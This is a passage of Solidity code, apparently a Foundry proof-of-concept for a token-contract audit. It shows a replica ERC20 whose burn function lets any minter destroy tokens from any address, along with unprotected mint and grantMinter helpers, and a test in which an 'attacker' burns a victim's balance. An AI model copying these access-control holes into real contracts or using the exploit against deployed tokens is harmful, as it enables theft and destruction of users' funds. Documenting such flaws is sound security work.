    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public minter;
    mapping(address => bool) internal isBlackListed;

    event Burn(address indexed burner, uint256 amount);

    modifier onlyMinter() {
        if (!minter[msg.sender]) revert("NotMinter");
        _;
    }

    modifier notBlacklisted(address _addr) {
        if (isBlackListed[_addr]) revert("Blacklisted");
        _;
    }

    // helper to set up tests: anyone can mint in this minimal replica
    function mint(address account, uint256 amount) external {
        balanceOf[account] += amount;
    }

    // helper to grant minter role (no access control here to simplify PoC)
    function grantMinter(address who) external {
        minter[who] = true;
    }

    function _burn(address burner, uint256 amount) internal {
        require(balanceOf[burner] >= amount, "insufficient");
        unchecked { balanceOf[burner] -= amount; }
    }

    // Vulnerable function: any account with minter role can burn tokens from ANY address
    function burn(address burner, uint256 amount) external onlyMinter notBlacklisted(burner) {
        require(amount != 0, "Invalid amount");
        _burn(burner, amount);
        emit Burn(burner, amount);
    }
}

contract ERC20TokenTest is Test {
    ERC20Token target;
    address attacker;
    address victim;

    function setUp() public {
        target = new ERC20Token();
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        // give victim some tokens
        target.mint(victim, 1000);

        // grant minter role to attacker
        target.grantMinter(attacker);

        assertEq(target.balanceOf(victim), 1000);
    }

    function test_attacker_exploits_burn() public {
        // attacker (a minter) burns victim's tokens without victim's consent
        vm.prank(attacker);
        target.burn(victim, 400);

        // victim lost funds
        assertEq(target.balanceOf(victim), 600);
    }
}

